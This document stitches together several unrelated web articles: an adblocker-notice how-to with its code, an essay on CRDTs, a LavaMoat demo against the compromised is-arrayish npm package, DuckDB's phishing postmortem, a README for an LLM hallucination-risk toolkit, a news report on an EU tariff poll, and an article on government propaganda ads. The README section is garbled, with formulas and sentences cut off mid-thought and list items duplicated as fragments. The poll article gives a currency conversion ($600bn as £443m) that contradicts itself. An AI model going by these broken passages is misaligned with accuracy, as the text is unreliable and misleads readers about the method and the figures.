  &lt;main&gt;&lt;head rend="h1"&gt;No adblocker detected.&lt;/head&gt;(Programming)&lt;p&gt;Internet ads are horrible: They waste your time, and the advertising industry makes the internet a worse place. Payouts are so small that the only way to survive is to turn your site into an ad filled hellhole with no real substance.&lt;/p&gt;&lt;p&gt;If you want to support your favorite authors: send then money. A dollar helps more then viewing ads ever would.&lt;/p&gt;&lt;p&gt;However, most people see advertising as a part of the internet experience, which is why I added this message to my site:&lt;/p&gt;&lt;p&gt;It’s shown off to the side, and never covers content. It won’t be shown if there isn’t enough space. The close button actually works and it stays closed.&lt;/p&gt;&lt;p&gt;The specific recommendation is important because a lot of people have only heard of adblockers from ads. Commercial adblockers range from sketchy to outright scams: If they are paying to be promoted, they must expect to make money from users.&lt;/p&gt;&lt;head rend="h2"&gt;Technical details:&lt;/head&gt;&lt;p&gt;The page itself contains a div to hold the message and tries to load a script called “nativeads.js”:&lt;/p&gt;&lt;code&gt;&amp;lt;!-- Rest of the page goes here --&amp;gt;

&amp;lt;script defer src="/nativeads.js"&amp;gt;&amp;lt;/script&amp;gt;

&amp;lt;div
  id="ad-note-hidden"
  class="ftf-dma-note ad native-ad native-ad-1 ytd-j yxd-j yxd-jd aff-content-col aff-inner-col aff-item-list ark-ad-message inplayer-ad inplayer_banners in_stream_banner trafficjunky-float-right dbanner preroll-blocker happy-inside-player blocker-notice blocker-overlay exo-horizontal ave-pl bottom-hor-block brs-block advboxemb wgAdBlockMessage glx-watermark-container overlay-advertising-new header-menu-bottom-ads rkads mdp-deblocker-wrapper amp-ad-inner imggif bloc-pub bloc-pub2 hor_banner aan_fake aan_fake__video-units rps_player_ads fints-block__row full-ave-pl full-bns-block vertbars video-brs player-bns-block wps-player__happy-inside gallery-bns-bl stream-item-widget adsbyrunactive happy-under-player adde_modal_detector adde_modal-overlay ninja-recommend-block aoa_overlay message"
&amp;gt;
  &amp;lt;p id="ad-note-content-wrapper"&amp;gt;
  &amp;lt;/p&amp;gt;
&amp;lt;/div&amp;gt;
&lt;/code&gt;&lt;p&gt;The script adds the actual message into the document:&lt;/p&gt;&lt;code&gt;// /nativeads.js

function hide() {
        document.getElementById("ad-note").id = 'ad-note-hidden';
	document.getElementById("ad-note-content-wrapper").innerHTML = "";
        document.cookie = "notice-shown=true;path=/";
}

if (!document.cookie.includes("notice-shown")) {
	document.getElementById("ad-note-hidden").id = 'ad-note';
	document.getElementById("ad-note-content-wrapper").innerHTML = "No adblocker detected. " + 
	"Consider using an extention like &amp;lt;a href=https://ublockorigin.com/&amp;gt;uBlock Origin&amp;lt;/a&amp;gt; to save time and bandwidth." +
	 " &amp;lt;u onclick=hide()&amp;gt;Click here to close.&amp;lt;/u&amp;gt;";
}
&lt;/code&gt;&lt;p&gt;Finally, there’s a bit of CSS to make it look nice:&lt;/p&gt;&lt;code&gt;#ad-note-hidden, #ad-note {
        display: none;
}

@media (min-height: 30em) { @media (min-width: 75em) {
        #ad-note {
                display: block;
                position: fixed;
                bottom: 1em;
                right: 1em;
                width: 14em;
                border: white 1px solid;
                background-color: #111111;
                padding: 1em;
        }
        #ad-note-content-wrapper {
                margin-top: 0em;
                margin-bottom: 0em;
        }
}}
&lt;/code&gt;&lt;p&gt;The message won’t be visible if an adblocker removes the &amp;lt;div&amp;gt; element – which has a lot of ad-like class names – or blocks the network request for “nativeads.js”.&lt;/p&gt;&lt;p&gt;The network request ensures that it doesn’t miss blockers like uBlock Origin Lite, which by default will only filter network requests, not page content.&lt;/p&gt;&lt;p&gt;Unfortunately, I have no way to detect DNS based blocking short of loading an actual ad. Instead, I made the message unobtrusive and easy to close.&lt;/p&gt;&lt;p&gt;The message won’t be shown in browsers that don’t support JavaScript, because those don’t need adblockers to begin with. It should be functional without CSS, but I can’t think of any browsers that support JS but not CSS. (but if you use external CSS, it’s quite common for the request to fail resulting in an unstyled page.)&lt;/p&gt;&lt;p&gt;Thanks to Stefan Bohacek for the original idea. I’ve modified it to reduce false positives and explicitly scoped the cookie so the message is only shown once.&lt;/p&gt;&lt;/main&gt;

  &lt;main&gt;
    &lt;head rend="h1"&gt;Strong Eventual Consistency - The Big Idea behind CRDTs&lt;/head&gt;
    &lt;p&gt;CRDTs. Data structures that can be replicated across multiple nodes, edited independently, merged back together, and it all just works. But collaborative document editing and multiplayer TODO lists are just the tip of the iceberg - I believe the big application is distributed databases, and for that we need to talk about consistency.&lt;/p&gt;
    &lt;p&gt;CRDTs are a tool for Strong Eventual Consistency. Let's start with the definition of normal Eventual Consistency1:&lt;/p&gt;
    &lt;list rend="dl"&gt;
      &lt;item rend="dt-1"&gt;Eventual Delivery&lt;/item&gt;
      &lt;item rend="dd-1"&gt;An update delivered to one node will eventually reaches all nodes&lt;/item&gt;
      &lt;item rend="dt-2"&gt;Eventual Convergence&lt;/item&gt;
      &lt;item rend="dd-2"&gt;If two nodes have seen all the same updates, they will eventually have the same state.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Strong Eventual Consistency (SEC) replaces Eventual Convergence with Strong Convergence:&lt;/p&gt;
    &lt;list rend="dl"&gt;
      &lt;item rend="dt-1"&gt;Strong Convergence&lt;/item&gt;
      &lt;item rend="dd-1"&gt;If two nodes have seen all the same updates, they will have the same state.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Spot the difference! In SEC two replicas have the same state as soon as the updates are processed, not eventually. If multiple nodes are updated independently, there will be conflicts - this is inevitable. What SEC guarantees is that these conflicts are solved automatically and deterministically.&lt;/p&gt;
    &lt;p&gt;This has massive implications. SEC means low latency, because nodes don't need to coordinate to handle reads and writes. It means incredible fault tolerance - every single node in the system bar one could simultaneously crash, and reads and writes could still happen normally. And it means nodes still function properly if they're offline or split from the network for arbitrary time periods.&lt;/p&gt;
    &lt;p&gt;Strong Eventual Consistency is Eventual Consistency that works. If you're doing local first, or low latency geo-replicated systems - accept no substitute. This is the context I think we should see CRDTs in - building blocks of Strongly Eventually Consistent systems. CRDTs as application state as one thing, CRDTs as entire databases are quite another.&lt;/p&gt;

  &lt;main&gt;
    &lt;p&gt;Phishing NPM package authors continues, unsurprisingly. The stakes are not high enough to switch from phishing to anything more advanced (like https://xkcd.com/538/) but seeing article blurbs say "Supply chain Attack" next to "These packages generally receive 2-3 billion downloads per week." might finally be enough to make an impression, one hopes.&lt;/p&gt;
    &lt;p&gt;This is not a detailed analysis of the attack, there's plenty of that already. If you're looking for one, visit our friends at https://socket.dev/blog/npm-author-qix-compromised-in-major-supply-chain-attack&lt;/p&gt;
    &lt;p&gt;Instead, let's look at how you could have a compromised dependency like that get into your app and be stopped.&lt;/p&gt;
    &lt;p&gt;One of the compromised packages was &lt;code&gt;is-arrayish&lt;/code&gt; and I'll use that as an example going forward.&lt;/p&gt;
    &lt;p&gt;So if an app uses &lt;code&gt;is-arrayish&lt;/code&gt; in the browser, it will override &lt;code&gt;fetch&lt;/code&gt;, &lt;code&gt;XMLHttpRequest&lt;/code&gt; and &lt;code&gt;window.ethereum.request&lt;/code&gt; and whenever it finds a transaction being sent, it'll replace the target address with one of the malware author's addresses that looks most alike.&lt;/p&gt;
    &lt;p&gt;I won't go into this either, but you can take a look at the summary of "donations" some other friends linked to here: https://intel.arkm.com/explorer/entity/61fbc095-f19b-479d-a037-5469aba332ab&lt;/p&gt;
    &lt;p&gt;Pretty low impact for an attack this big. Some of it seems to be people mocking the malware author with worthless transfers.&lt;/p&gt;
    &lt;p&gt;Say we have an app. The app allows the user to send a meaningless transaction to themselves. Don't expect it to make sense. It also uses &lt;code&gt;is-arrayish&lt;/code&gt; because otherwise we'd have nothing to demo.&lt;/p&gt;
    &lt;code&gt;const isArrayish = require("is-arrayish");

const button = document.createElement("button");
button.textContent = "Send ETH Transaction";
document.body.appendChild(button);

button.addEventListener("click", async () =&amp;gt; {
  const accounts = await window.ethereum.request({
    method: "eth_requestAccounts",
  });
  if (!isArrayish(accounts)) {
    throw new Error("Accounts response must be array-like");
  }
  const myAddr = accounts[0];

  const txHash = await window.ethereum.request({
    method: "eth_sendTransaction",
    params: [
      {
        value: "0x5af3107a4000",
        from: myAddr,
        to: myAddr,
      },
    ],
  });
  console.log("Transaction sent:", txHash);
});&lt;/code&gt;
    &lt;p&gt;This is what it looks like:&lt;/p&gt;
    &lt;p&gt;Now after you update &lt;code&gt;is-arrayish&lt;/code&gt; to 0.3.3 and rebuild the project, you might notice a slight difference.&lt;/p&gt;
    &lt;p&gt;If your project was set up with LavaMoat, you'd be using a policy to decide which package is allowed access to what. More about policies in the guide&lt;/p&gt;
    &lt;p&gt;With LavaMoat, all &lt;code&gt;is-arrayish&lt;/code&gt; can do is fail:&lt;/p&gt;
    &lt;code&gt;TypeError: Cannot define property fetch, object is not extensible
&lt;/code&gt;
    &lt;p&gt;BTW, If the malware was written a little better to avoid detection and fail silently, the functionality of the app would be fully restored.&lt;/p&gt;
    &lt;p&gt;To protect the project, @lavamoat/webpack was used.&lt;/p&gt;
    &lt;p&gt;In short, what it does is: it puts modules from every dependency in a separate lexical global context that we call &lt;code&gt;Compartment&lt;/code&gt; and only allows access to globals that the policy lists. I also controls which packages can import which other packages.&lt;/p&gt;
    &lt;p&gt;If the project dependency gets updated to contain malicious code, the policy will not allow it to access any globals or imports it didn't use before.&lt;/p&gt;

  &lt;main&gt;
    &lt;head rend="h1"&gt;DuckDB NPM packages 1.3.3 and 1.29.2 compromised with malware&lt;/head&gt;
    &lt;head rend="h2"&gt;Description&lt;/head&gt;
    &lt;p&gt;The DuckDB distribution for Node.js on npm was compromised with malware (along with several other packages). An attacker published new versions of four of duckdb’s packages that included malicious code to interfere with cryptocoin transactions. The following packages and versions are affected:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;code&gt;@duckdb/node-api@1.3.3&lt;/code&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;code&gt;@duckdb/node-bindings@1.3.3&lt;/code&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;code&gt;duckdb@1.3.3&lt;/code&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;code&gt;@duckdb/duckdb-wasm@1.29.2&lt;/code&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;
      &lt;p&gt;Note: The current release version of DuckDB is 1.3.2, with 1.4.0 expected to be released on Sept 10th, 2025 (tomorrow as of this writing). We do not plan to ever release a “legit” DuckDB 1.3.3. Users should double-check that they are not accidentally updating to those affected versions.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;We have ourselves noticed this within four hours of it happening. Here’s our response:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;As an immediate response, we have deprecated the specific versions.&lt;/item&gt;
      &lt;item&gt;We have reached out to npm support to delete the affected versions. They were so kind to do so.&lt;/item&gt;
      &lt;item&gt;We have also re-released the node packages with higher version numbers (1.3.4/1.30.0) as a further safeguard so the latest version of the package points to a safe version&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;We apologize for this issue. We are reviewing our internal processes to ensure the safety of future releases.&lt;/p&gt;
    &lt;head rend="h3"&gt;Postmortem&lt;/head&gt;
    &lt;p&gt;On September 8th (Monday), the DuckDB maintainers received the following message from "...@npmjs.help":&lt;/p&gt;
    &lt;p&gt;One of the maintainers read through this text and found it somewhat reasonable. He followed the link (now defunct) to a website hosted under the domain &lt;code&gt;npmjs.help&lt;/code&gt;. This website contained a pixel-perfect copy of the npmjs.com website. He logged in using the &lt;code&gt;duckdb_admin&lt;/code&gt; user and password, followed by 2FA. Again, the user profile, settings etc. were a perfect copy of the npmjs.com website including all user data. As requested by the email, he then re-set the 2FA setup.&lt;/p&gt;
    &lt;p&gt;In the background, the copycat website forwarded all actions to the actual npm website, so the 2FA was actually updated there, too. But they also added a new API token, which they then used to publish the malicious package versions. In hindsight, the fact that his browser did not auto-complete the login should have been a red flag. It's painful to spell out, but we fell for a classic phishing attack.&lt;/p&gt;
    &lt;p&gt;We again apologize for this mishap. We are reviewing our internal processes to ensure the safety of future releases. It is fortunate that we noticed this within a few hours of it happening. The DuckDBLabs team was able to set up a call at 7AM to perform an immediate response. Fortunately we were not locked out of our NPM account, which also easily could have happened. We were able to rotate passwords, tokens and API keys immediately.&lt;/p&gt;
  &lt;/main&gt;

  &lt;main&gt;
    &lt;p&gt;Post-hoc calibration without retraining for large language models. This toolkit turns a raw prompt into:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;a bounded hallucination risk using the Expectation-level Decompression Law (EDFL), and&lt;/item&gt;
      &lt;item&gt;a decision to ANSWER or REFUSE under a target SLA, with transparent math (nats).&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;It supports two deployment modes:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Evidence-based: prompts include evidence/context; rolling priors are built by erasing that evidence.&lt;/item&gt;
      &lt;item&gt;Closed-book: prompts have no evidence; rolling priors are built by semantic masking of entities/numbers/titles.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;All scoring relies only on the OpenAI Chat Completions API. No retraining required.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Install &amp;amp; Setup&lt;/item&gt;
      &lt;item&gt;Core Mathematical Framework&lt;/item&gt;
      &lt;item&gt;Understanding System Behavior&lt;/item&gt;
      &lt;item&gt;Two Ways to Build Rolling Priors&lt;/item&gt;
      &lt;item&gt;API Surface&lt;/item&gt;
      &lt;item&gt;Calibration &amp;amp; Validation&lt;/item&gt;
      &lt;item&gt;Practical Considerations&lt;/item&gt;
      &lt;item&gt;Project Layout&lt;/item&gt;
      &lt;item&gt;Deployment Options&lt;/item&gt;
    &lt;/list&gt;
    &lt;code&gt;pip install --upgrade openai
export OPENAI_API_KEY=sk-...&lt;/code&gt;
    &lt;quote&gt;&lt;p&gt;The module uses&lt;/p&gt;&lt;code&gt;openai&amp;gt;=1.0.0&lt;/code&gt;and the Chat Completions API (e.g.,&lt;code&gt;gpt-4o&lt;/code&gt;,&lt;code&gt;gpt-4o-mini&lt;/code&gt;).&lt;/quote&gt;
    &lt;p&gt;Let the binary event &lt;lb/&gt; Build an ensemble of content-weakened prompts (the rolling priors) &lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;p&gt;Information budget:&lt;/p&gt;&lt;math-renderer&gt;$$\bar{\Delta} = \tfrac{1}{m}\sum_k \mathrm{clip}_+(\log P(y) - \log S_k(y), B)$$&lt;/math-renderer&gt;(one-sided clipping; default&lt;math-renderer&gt;$B=12$&lt;/math-renderer&gt;nats to prevent outliers while maintaining conservative bounds).&lt;/item&gt;
      &lt;item&gt;&lt;p&gt;Prior masses:&lt;/p&gt;&lt;math-renderer&gt;$q_k = S_k(\mathcal{A})$&lt;/math-renderer&gt;, with:&lt;list rend="ul"&gt;&lt;item&gt;&lt;math-renderer&gt;$\bar{q}=\tfrac{1}{m}\sum_k q_k$&lt;/math-renderer&gt;(average prior for EDFL bound)&lt;/item&gt;&lt;item&gt;&lt;math-renderer&gt;$q_{\text{lo}}=\min_k q_k$&lt;/math-renderer&gt;(worst-case prior for SLA gating)&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;By EDFL, the achievable reliability is bounded by:&lt;/p&gt;
    &lt;p&gt;Thus the hallucination risk (error) is bounded by &lt;/p&gt;
    &lt;p&gt;For target hallucination rate &lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt; Bits-to-Trust: &lt;math-renderer&gt;$\mathrm{B2T} = \mathrm{KL}(\mathrm{Ber}(1-h^*) | \mathrm{Ber}(q_{\text{lo}}))$&lt;/math-renderer&gt;&lt;/item&gt;
      &lt;item&gt; Information Sufficiency Ratio: &lt;math-renderer&gt;$\mathrm{ISR} = \bar{\Delta}/\mathrm{B2T}$&lt;/math-renderer&gt;&lt;/item&gt;
      &lt;item&gt; ANSWER iff &lt;math-renderer&gt;$\mathrm{ISR}\ge 1$&lt;/math-renderer&gt;and&lt;math-renderer&gt;$\bar{\Delta} \ge \mathrm{B2T} + \text{margin}$&lt;/math-renderer&gt;(default&lt;code&gt;margin≈0.2&lt;/code&gt;nats)&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;&lt;p&gt;Why two priors? The gate uses worst-case&lt;/p&gt;&lt;math-renderer&gt;$q_{\text{lo}}$&lt;/math-renderer&gt;for strict SLA compliance. The RoH bound uses average&lt;math-renderer&gt;$\bar{q}$&lt;/math-renderer&gt;per EDFL theory. This dual approach ensures conservative safety while providing realistic risk bounds.&lt;/quote&gt;
    &lt;p&gt;The toolkit exhibits different behaviors across query types, which is mathematically consistent with the framework:&lt;/p&gt;
    &lt;p&gt;Observation: May abstain despite apparent simplicity&lt;lb/&gt; Explanation:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Models often attempt answers even with masked numbers (pattern recognition)&lt;/item&gt;
      &lt;item&gt;This yields low information lift &lt;math-renderer&gt;$\bar{\Delta} \approx 0$&lt;/math-renderer&gt;between full prompt and skeletons&lt;/item&gt;
      &lt;item&gt;Despite potentially low EDFL risk bound, worst-case prior gate triggers abstention (ISR &amp;lt; 1)&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Observation: Generally answered with confidence&lt;lb/&gt; Explanation:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Masking entities/dates substantially reduces answer propensity in skeletons&lt;/item&gt;
      &lt;item&gt;Restoring these yields large &lt;math-renderer&gt;$\bar{\Delta}$&lt;/math-renderer&gt;that clears B2T threshold&lt;/item&gt;
      &lt;item&gt;System answers with tight EDFL risk bound&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;This is not a bug but a feature: The framework prioritizes safety through worst-case guarantees while providing realistic average-case bounds.&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;
        &lt;p&gt;Switch Event Measurement&lt;/p&gt;
        &lt;list rend="ul"&gt;
          &lt;item&gt;Use Correct/Incorrect instead of Answer/Refuse for factual QA&lt;/item&gt;
          &lt;item&gt;Skeletons without key information rarely yield correct results → large &lt;math-renderer&gt;$\bar{\Delta}$&lt;/math-renderer&gt;&lt;/item&gt;
        &lt;/list&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Enhance Skeleton Weakening&lt;/p&gt;
        &lt;list rend="ul"&gt;
          &lt;item&gt;Implement mask-aware decision head that refuses on redaction tokens&lt;/item&gt;
          &lt;item&gt;Ensures skeletons have strictly lower "Answer" mass than full prompt&lt;/item&gt;
        &lt;/list&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Calibration Adjustments&lt;/p&gt;
        &lt;list rend="ul"&gt;
          &lt;item&gt;Relax &lt;math-renderer&gt;$h^*$&lt;/math-renderer&gt;slightly (e.g., 0.10 instead of 0.05) for higher answer rates&lt;/item&gt;
          &lt;item&gt;Reduce margin for less conservative gating&lt;/item&gt;
          &lt;item&gt;Increase sampling (&lt;math-renderer&gt;$n=7-10$&lt;/math-renderer&gt;) for stability&lt;/item&gt;
        &lt;/list&gt;
      &lt;/item&gt;
      &lt;item&gt;Relax &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Provide Evidence&lt;/p&gt;
        &lt;list rend="ul"&gt;
          &lt;item&gt;Adding compact, relevant evidence increases &lt;math-renderer&gt;$\bar{\Delta}$&lt;/math-renderer&gt;while preserving bounds&lt;/item&gt;
        &lt;/list&gt;
      &lt;/item&gt;
      &lt;item&gt;Adding compact, relevant evidence increases &lt;/item&gt;
    &lt;/list&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Prompt contains a field like &lt;code&gt;Evidence:&lt;/code&gt;(or JSON keys)&lt;/item&gt;
      &lt;item&gt;Skeletons erase the evidence content but preserve structure and roles; then permute blocks deterministically (seeded)&lt;/item&gt;
      &lt;item&gt;Decision head: "Answer only if the provided evidence is sufficient; otherwise refuse."&lt;/item&gt;

      &lt;item&gt; Select smallest margin where Wilson upper bound ≤ target &lt;math-renderer&gt;$h^*$&lt;/math-renderer&gt;(e.g., 5%)&lt;/item&gt;
      &lt;item&gt; Freeze policy: &lt;math-renderer&gt;$(h^*, \tau, \text{margin}, B, \text{clip_mode}, m, r, \text{skeleton_policy})$&lt;/math-renderer&gt;&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;The toolkit provides comprehensive metrics:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Answer/abstention rates&lt;/item&gt;
      &lt;item&gt;Empirical hallucination rate + Wilson bound&lt;/item&gt;

    &lt;/list&gt;
    &lt;p&gt;Cause: Pattern recognition allows answers even with masked numbers&lt;/p&gt;

  &lt;main&gt;
    &lt;p&gt;A majority of people across the EU’s five biggest member states believe the European Commission sold citizens out when negotiating a “humiliating” tariff deal with Donald Trump that “benefits the US” far more than Europe, a survey has shown.&lt;/p&gt;
    &lt;p&gt;The poll, by Cluster17 for the European affairs debate platform Le Grand Continent, found 77% of respondents – ranging from 89% in France to 50% in Poland – thought the deal would benefit above all the US economy, with only 2% believing it would benefit Europe’s.&lt;/p&gt;
    &lt;p&gt;Across the five countries, which accounted for about 60% of the bloc’s population, an average of 52% described the deal agreed in July by Trump and the European Commission president, Ursula von der Leyen, as a “humiliation”.&lt;/p&gt;
    &lt;p&gt;Under the deal, the EU is to remove tariffs on all US industrial goods and provide preferential market access for a wide range of US seafood and agricultural goods. Most EU goods entering the US, however, will be subject to a 15% baseline tariff.&lt;/p&gt;
    &lt;p&gt;In addition, EU firms are to invest an extra $600bn (£443m) in the US, and the bloc must buy $750bn of US energy and dramatically increase spending on US defence exports – requirements viewed negatively by more than two-thirds of poll respondents.&lt;/p&gt;
    &lt;p&gt;Von der Leyen hailed the agreement as “a huge deal” that brought “stability” and “predictability”, as well as avoiding Trump’s threatened 30% tariff rate. However, commentators have argued that the EU gave up far more that the US, and in effect capitulated to Washington’s bullying.&lt;/p&gt;
    &lt;p&gt;That is a view shared by most Europeans, judging by the poll, which was published on Tuesday. An average of 75% of respondents said von der Leyen had defended European interests “very” or “fairly” badly.&lt;/p&gt;
    &lt;p&gt;Almost 70% said they would be willing to boycott US goods over the terms of the deal; 44% considered Trump “an enemy of Europe”; 47% felt he had “autocratic tendencies”; and 36% said he “behaves like a dictator”.&lt;/p&gt;
    &lt;p&gt;More than three-quarters of those surveyed said they were very or fairly dissatisfied with the EU’s approach to the Trump administration, with almost 40% saying they felt the bloc should stand up and oppose the whims of the US president.&lt;/p&gt;
    &lt;p&gt;Days before von der Leyen is scheduled to deliver her 2025 “state of the union” address, a clear majority of respondents (60%) across the five countries said they would view the commission chief’s resignation “very” or “fairly” favourably.&lt;/p&gt;
    &lt;p&gt;In a clear message to Brussels, although majorities ranging from 85% in Spain to 61% in France felt their country should remain an EU member, 37% said that if the bloc failed to protect its citizens from geopolitical risks, quitting “should be envisaged”.&lt;/p&gt;

  &lt;main&gt;
    &lt;head rend="h1"&gt;Weaponizing Ads: How Governments Use Google Ads and Facebook Ads to Wage Propaganda Wars&lt;/head&gt;
    &lt;p&gt;In late 2024, the head of the UN’s Gaza aid agency made a disturbing discovery: when people searched for his organization on Google, the top result wasn’t the agency’s own site — it was a paid ad placed by the Israeli government. The ad mimicked a UN website but actually linked to an Israeli government page accusing the UN Relief and Works Agency (UNRWA) of supporting terroists (wired.com). “The spread of misinformation &amp;amp; disinformation continues to be used as a weapon in the war in Gaza,” UNRWA Commissioner-General Philippe Lazzarini warned, calling for investigations and stricter regulation of online propaganda (aljazeera.com). His alarm highlights a troubling new reality: digital advertising platforms have become battlefields for influence, where governments and political groups pay to sway public opinion in wars and crises.&lt;/p&gt;
    &lt;p&gt;Traditional propaganda , think radio broadcasts, posters, state TV, has now gone high-tech. Platforms like Google Ads and Facebook (Meta) Ads allow paries to target specific audiences with tailored messages at massive scale. In theory, these companies have policies against hate speech or blatant lies. In practice, recent case studies show that sophisticated misinformation campaigns can exploit loopholes and lax enforcement, reaching millions of people with government-funded narratives. From the Israel–Palestine conflict to Russian and domestic political meddling, paid ads are being weaponized to promote war efforts, demonize opponents, and even undermine institutions like the UN. This article examines how it’s happening, why the platforms permit it, and what ethical and policy questions arise.&lt;/p&gt;
    &lt;head rend="h2"&gt;Digital Propaganda via Paid Ads: A New Front in Information Warfare&lt;/head&gt;
    &lt;p&gt;Paid advertising on Google and Facebook has become a potent tool for political persuasion or manipulation. Unlike organic social media posts (which rely on shares or algorithms), ads can guarantee visibility: if you pay, you reach your target. And the targeting can be extremely granular. Google Ads lets advertisers bid on search keywords or place banner/video ads on websites and YouTube, often filtered by geography or audience interests. Facebook/Meta’s ad system enables micro-targeting by demographics, location, and user interests, while requiring a “paid for by” disclaimer on political ads for transparency. In theory, this gives legitimate political campaigns a way to reach supporters , but it equally gives propagandists a direct channel to the eyeballs of a chosen populace.&lt;/p&gt;
    &lt;p&gt;Researchers note that this capacity can be abused by partisan or state actors to “manipulate or distract citizens with misinformation and government propaganda,” posing serious challenges to democracy (academic.oup.com). A notorious early example was Russia’s Internet Research Agency, which in 2016 created hundreds of fake Facebook accounts and purchased at least $100,000 worth of divisive ads to influence the U.S. election (abcnews.go.com). Many of those ads didn’t mention candidates directly; instead they amplified polarizing messages on issues like immigration and race to inflame social tensions. At the time, Facebook admitted that most of these propaganda ads “did not violate any company policies or laws,” underscoring how unprepared the platform’s rules were (abcnews.go.com). The incident sparked global awareness that paid media ads could be used as a propaganda weapon , and led to new transparency measures like Facebook’s Ads Library.&lt;/p&gt;
    &lt;p&gt;Yet, increased transparency hasn’t prevented the tactic from evolving. Recent conflicts show governments openly turning to ad campaigns as part of their information warfare strategy. Paid ads can be launched rapidly, scaled globally, and tailored to undermine an opponent or shape public perception of a war. Crucially, they also allow a state to influence foreign publics, beyond its own borders, often skirting the line of platform policies and international norms. The sections below explore a timely case study and the broader implications.&lt;/p&gt;
    &lt;head rend="h2"&gt;Case Study: Israel’s Paid Propaganda Campaign in the Gaza War&lt;/head&gt;
    &lt;p&gt;One of the clearest illustrations of war propaganda via paid ads is the Israeli government’s online advertising blitz during the 2023–2025 Gaza war. Israel has long engaged in hasbara (Hebrew for “explanation”), a term for state public relations efforts or propaganda (smex.org). But since the war in Gaza, Israel’s use of digital ads has intensified to unprecedented levels (smex.org).&lt;/p&gt;
    &lt;head rend="h2"&gt;Targeting the UN: Google Ads to Discredit Humanitarians&lt;/head&gt;
    &lt;p&gt;In mid-January 2024, staff at UNRWA USA (a U.S.-based fundraising affiliate of the UN agency) noticed something strange: Google searches for “UNRWA” were yielding an ad that looked like it was from UNRWA, but actually led to an Israeli government site (wired.com). Upon investigation, they discovered a months-long Google Ads campaign by the Israeli Government Advertising Agency to discredit UNRWA (wired.com). The Israeli ads, which were clearly labeled as such in Google’s transparency data, appeared on searches for over 300 related keywords, from “UNRWA” to “Gaza aid”, effectively hijacking traffic from people seeking the UN agency (wired.com). The content of the ads and the landing pages was unmistakably propagandistic: the Israeli site alleged that UNRWA was “inseparable from Hamas” and even employed terrorists (wired.com). One ad bluntly asked, “Paychecks for terrorists or humanitarian aid?”, suggesting money given to UNRWA would fund armed militants (abc.net.au).&lt;/p&gt;
    &lt;p&gt;The aim of this campaign was clear: to cut off support and donations to the UN’s relief agency in Gaza. It came at a critical time, as UNRWA was providing life-saving food, water, and medical care to Palestinians under siege. UNRWA’s chief, Philippe Lazzarini, blasted Israel’s actions as a “deliberate disinformation campaign” to “dismantle the agency”, warning that smearing a humanitarian organization not only hurts its reputation but “puts the lives of our colleagues on the frontline at serious risk” (abc.net.au). In essence, Israeli authorities were using Google’s advertising system to undermine a UN institution in the middle of a humanitarian crisis.&lt;/p&gt;
    &lt;p&gt;Google’s response was relatively hands-off. When UNRWA representatives appealed to Google to stop what they saw as a dangerous misinformation campaign, the company did not immediately take down the ads (wired.com). A Google spokesperson defended that any government may run ads on Google as long as they adhere to our policies, and stated that Google enforces those rules “consistently and without bias” (wired.com). In other words, because the Israeli ads did not overtly violate Google’s ad policies, they were allowed to run. Notably, Google’s ad policies do prohibit misrepresentation, but they do not have a blanket ban on misinformation unless it relates to specific sensitive areas like election integrity (gomixte.com). As Wired reported, Google generally permits questionable claims in ads “unless it undermines participation or trust in an electoral process” (gomixte.com). This loophole meant that propaganda undermining a humanitarian agency , while arguably unethical , wasn’t against the rules.&lt;/p&gt;
    &lt;p&gt;The result: Israel’s anti-UNRWA ads often outcompeted the agency’s own Google ads. From May through July 2024, in head-to-head bidding, the Israeli ads won the top slot 44% of the time (versus UNRWA USA’s ads showing 34% of the time) (wired.com). UNRWA’s team had to spend tens of thousands of donor dollars trying to outbid Israel for visibility (wired.com). This “insidious” campaign, as UNRWA called it, exposed countless Americans and others to one-sided allegations just as they were searching for facts about Gaza relief (wired.com). “I want the public to know what’s happening,” said UNRWA USA director Mara Kronenfeld, “especially at a time when civilian lives are under attack in Gaza” (wired.com).&lt;/p&gt;
    &lt;p&gt;By late 2024, news investigations across the world had caught on. ABC News in Australia found that those same Israeli ads linking UNRWA to Hamas were appearing on major Australian news sites, served via Google’s display network (abc.net.au). The ads featured a masked militant wearing both the Hamas emblem and an UNRWA headband, visually equating the UN agency with a terror group (abc.net.au). Captions like “UNRWA has alternatives, it must be replaced” were shown next to news articles (abc.net.au). ABC confirmed at least eight such ad variants were targeted specifically at Australian audiences (in English) and noted the campaign ran in multiple languages including German, Italian, French, and Spanish (abc.net.au). This truly was a global propaganda ad campaign, orchestrated by a government via Google’s platforms.&lt;/p&gt;
